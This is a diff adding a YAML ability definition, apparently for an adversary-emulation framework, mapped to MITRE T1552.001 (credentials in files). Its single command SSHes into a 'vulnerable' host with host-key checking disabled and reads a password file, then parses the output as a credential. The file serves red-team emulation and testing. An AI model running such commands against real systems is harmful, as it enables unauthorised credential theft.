@@ -1,0 +1,37 @@
+- tactic: credential-access
+  technique_name: 'Unsecured Credentials: Credentials In Files'
+  technique_id: T1552.001
+  name: Retrieve Password from known file using SSH - BGU
+  description: auto-generated
+  executors:
+  - name: sh
+    platform: linux
+    command: 'ssh -o StrictHostKeyChecking=no #{vulnerable.hostname}@#{vulnerable.ip}
+      "cat #{password.file}"'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.stockpile.app.parsers.basic
+      parserconfigs:
+      - source: output
+        edge: ''
+        target: password
+        custom_parser_vals: {}
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - credential-access
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 85f41c0c-29a6-4780-87de-1f467f97142f
